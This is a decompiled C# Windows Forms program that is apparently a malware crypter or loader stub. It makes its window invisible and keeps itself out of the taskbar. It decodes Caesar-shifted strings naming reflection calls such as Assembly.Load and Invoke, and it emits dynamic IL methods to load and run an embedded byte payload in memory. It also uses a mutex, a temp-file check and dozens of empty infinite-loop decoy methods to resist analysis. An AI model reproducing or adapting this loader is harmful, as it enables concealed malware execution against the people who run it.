using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;

public class GForm0 : Form
{
	public delegate string GDelegate0(object wkk, object awkj);

	public delegate string GDelegate1(string l92);

	public delegate object GDelegate2();

	public delegate object GDelegate3();

	public delegate object GDelegate4();

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	public static int int_0 = 0;

	private int int_1;

	public static bool bool_0 = true;

	public static int int_2 = 0;

	public static byte[] byte_0;

	public static byte[] byte_1;

	public StringBuilder stringBuilder_0;

	private string string_0;

	private string string_1;

	private string string_2;

	public static object object_0;

	public static object object_1 = RuntimeHelpers.GetObjectValue(GClass0.etets());

	public static object object_2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(object_1, (Type)null, "GetILGenerator", new object[0], (string[])null, (Type[])null, (bool[])null));

	public virtual _003F Timer_0
	{
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (timer_0 != null)
			{
				timer_0.remove_Tick((EventHandler)Timer1_Tick);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new GForm0());
	}

	public GForm0()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)GForm0_Load);
		Timer_0 = new Timer();
		int_1 = 0;
		stringBuilder_0 = new StringBuilder();
		string_0 = "Pdl";
		string_1 = "4";
		string_2 = "0";
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
	}

	public static object trimmit(string data, int key)
	{
		checked
		{
			key++;
			return data.Substring(0, data.Length - key);
		}
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		int num = default(int);
		try
		{
			Thread.Sleep(200);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		GClass5.smethod_0();
		GClass0.smethod_1(Assembly.GetExecutingAssembly().Location, Path.GetFileName(Assembly.GetExecutingAssembly().Location));
		try
		{
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
		GClass2.smethod_0();
		string text = Conversions.ToString(0);
		try
		{
			byte_0 = (byte[])method_0(smethod_3(RuntimeHelpers.GetObjectValue(GClass3.smethod_0()), string_1));
			byte_1 = (byte[])method_0(GClass7.smethod_2(Conversions.ToString(GClass4.smethod_0()), "ØûÊéúùîÓ"));
			if (!File.Exists(((ServerComputer)Class2.unknown_0).get_FileSystem().get_SpecialDirectories().get_Temp() + "%bndertp%"))
			{
				try
				{
					Thread.Sleep(200);
				}
				catch (Exception ex6)
				{
					ProjectData.SetProjectError(ex6, num);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(200);
			lkwkw();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			num = 0;
			if (Conversions.ToDouble(text) != 0.0)
			{
				break;
			}
			text = Conversions.ToString(1);
			num = 1;
		}
		Thread.Sleep(100);
	}

	public static void smethod_0()
	{
	}

	public static void lkwkw()
	{
		GClass6.smethod_1(byte_0);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Mutex mutex = new Mutex(initiallyOwned: false, "jahsdhjjgaAWdawddawhasjSddDaETLY");
		if (!mutex.WaitOne(0, exitContext: false))
		{
			ProjectData.EndApp();
		}
	}

	public object method_0(string string_3)
	{
		object obj = new DynamicMethod("屁艾吾德尔253àÒøきin99いぇみわ", GClass0.pm2(), new Type[1] { typeof(string) });
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "GetILGenerator", new object[0], (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(objectValue, (Type)null, "DeclareLocal", new object[1] { GClass0.pm() }, (string[])null, (Type[])null, (bool[])null, true);
		MethodInfo methodInfo = (MethodInfo)GClass7.smethod_1();
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_0 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array = new object[2]
		{
			OpCodes.Call,
			methodInfo
		};
		object[] array2 = array;
		bool[] array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", array2, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			methodInfo = (MethodInfo)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(MethodInfo));
		}
		NewLateBinding.LateCall(objectValue, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		return (byte[])NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
		{
			null,
			new object[1] { string_3 }
		}, (string[])null, (Type[])null, (bool[])null);
	}

	public static string lw928(string w)
	{
		return smethod_3(w, "1");
	}

	public static object smethod_1(byte[] byte_2, object[] object_3, string string_3, string string_4)
	{
		GDelegate0 gDelegate = smethod_3;
		GDelegate4 gDelegate2 = GClass2.smethod_1;
		string text = "";
		object_0 = RuntimeHelpers.GetObjectValue(GClass4.smethod_1());
		NewLateBinding.LateCall(object_2, (Type)null, "DeclareLocal", new object[1] { Type.GetType(gDelegate("V|vwhp1Uhiohfwlrq1Dvvhpeo|", 3)) }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_0 }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Call,
			Type.GetType(gDelegate("V|vwhp1Uhiohfwlrq1Dvvhpeo|", 3))!.GetMethod(gDelegate("Ordg", 3), new Type[1] { GClass0.pm() }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Stloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		object obj = object_2;
		object[] array = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(object_0)
		};
		object[] array2 = array;
		bool[] array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(obj, (Type)null, "Emit", array2, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			object_0 = RuntimeHelpers.GetObjectValue(array[1]);
		}
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		object obj2 = object_2;
		object[] array4 = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(object_0)
		};
		object[] array5 = array4;
		array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(obj2, (Type)null, "Emit", array5, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			object_0 = RuntimeHelpers.GetObjectValue(array4[1]);
		}
		GClass6.smethod_3();
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			Type.GetType(gDelegate("V|vwhp1Uhiohfwlrq1Dvvhpeo|", 3))!.GetMethod(gDelegate("JhwW|sh", 3), new Type[1] { GClass0.pm3() }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			Type.GetType(gDelegate("V|vwhp1W|sh", 3))!.GetMethod(gDelegate("JhwPhwkrg", 3), new Type[1] { GClass0.pm3() }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			RuntimeHelpers.GetObjectValue(GClass5.smethod_1()),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			RuntimeHelpers.GetObjectValue(GClass7.smethod_0()),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		gDelegate2();
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			RuntimeHelpers.GetObjectValue(GClass7.smethod_0()),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			RuntimeHelpers.GetObjectValue(smethod_4()),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(object_2, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		text += "尔";
		return NewLateBinding.LateGet(object_1, (Type)null, "Invoke", new object[2]
		{
			null,
			new object[4] { byte_2, object_3, string_3, string_4 }
		}, (string[])null, (Type[])null, (bool[])null);
	}

	public static object smethod_2()
	{
		GDelegate0 gDelegate = smethod_3;
		return Type.GetType(gDelegate("V|vwhp1Uhiohfwlrq1Dvvhpeo|", 3))!.GetMethod(gDelegate("JhwW|sh", 3), new Type[1] { typeof(string) });
	}

	public static string smethod_3(object object_3, object object_4)
	{
		StringBuilder stringBuilder = new StringBuilder();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)object_3).GetEnumerator();
			while (enumerator.MoveNext())
			{
				char c = Conversions.ToChar(enumerator.Current);
				object obj = Strings.Asc(c);
				object obj2 = Operators.SubtractObject(obj, object_4);
				char value = Strings.ChrW(Conversions.ToInteger(obj2));
				stringBuilder.Append(value);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return stringBuilder.ToString();
	}

	public static object smethod_4()
	{
		GDelegate0 gDelegate = smethod_3;
		return Type.GetType(gDelegate("V|vwhp1Uhiohfwlrq1PhwkrgEdvh", 3))!.GetMethod(gDelegate("Lqyrnh", 3), new Type[2]
		{
			typeof(object),
			typeof(object[])
		});
	}

	private void method_1()
	{
		while (true)
		{
		}
	}

	private void method_2()
	{
		while (true)
		{
		}
	}

	private void method_3()
	{
		while (true)
		{
		}
	}

	private void method_4()
	{
		while (true)
		{
		}
	}

	private void method_5()
	{
		while (true)
		{
		}
	}

	private void method_6()
	{
		while (true)
		{
		}
	}

	private void method_7()
	{
		while (true)
		{
		}
	}

	private void method_8()
	{
		while (true)
		{
		}
	}

	private void method_9()
	{
		while (true)
		{
		}
	}

	private void method_10()
	{
		while (true)
		{
		}
	}

	private void method_11()
	{
		while (true)
		{
		}
	}

	private void method_12()
	{
		while (true)
		{
		}
	}

	private void method_13()
	{
		while (true)
		{
		}
	}

	private void method_14()
	{
		while (true)
		{
		}
	}

	private void method_15()
	{
		while (true)
		{
		}
	}

	private void method_16()
	{
		while (true)
		{
		}
	}

	private void method_17()
	{
		while (true)
		{
		}
	}

	private void method_18()
	{
		while (true)
		{
		}
	}

	private void method_19()
	{
		while (true)
		{
		}
	}

	private void method_20()
	{
		while (true)
		{
		}
	}

	private void method_21()
	{
		while (true)
		{
		}
	}

	private void method_22()
	{
		while (true)
		{
		}
	}

	private void method_23()
	{
		while (true)
		{
		}
	}

	private void method_24()
	{
		while (true)
		{
		}
	}

	private void method_25()
	{
		while (true)
		{
		}
	}

	private void method_26()
	{
		while (true)
		{
		}
	}

	private void method_27()
	{
		while (true)
		{
		}
	}

	private void method_28()
	{
		while (true)
		{
		}
	}

	private void method_29()
	{
		while (true)
		{
		}
	}

	private void method_30()
	{
		while (true)
		{
		}
	}

	private void method_31()
	{
		while (true)
		{
		}
	}

	private void method_32()
	{
		while (true)
		{
		}
	}

	private void method_33()
	{
		while (true)
		{
		}
	}

	private void method_34()
	{
		while (true)
		{
		}
	}

	private void method_35()
	{
		while (true)
		{
		}
	}

	private void method_36()
	{
		while (true)
		{
		}
	}

	private void method_37()
	{
		while (true)
		{
		}
	}

	private void method_38()
	{
		while (true)
		{
		}
	}

	private void method_39()
	{
		while (true)
		{
		}
	}

	private void method_40()
	{
		while (true)
		{
		}
	}

	private void method_41()
	{
		while (true)
		{
		}
	}

	private void method_42()
	{
		while (true)
		{
		}
	}

	private void method_43()
	{
		while (true)
		{
		}
	}

	private void method_44()
	{
		while (true)
		{
		}
	}

	private void method_45()
	{
		while (true)
		{
		}
	}

	private void method_46()
	{
		while (true)
		{
		}
	}

	private void method_47()
	{
		while (true)
		{
		}
	}

	private void method_48()
	{
		while (true)
		{
		}
	}

	private void method_49()
	{
		while (true)
		{
		}
	}

	private void method_50()
	{
		while (true)
		{
		}
	}

	private void method_51()
	{
		while (true)
		{
		}
	}

	private void method_52()
	{
		while (true)
		{
		}
	}
}
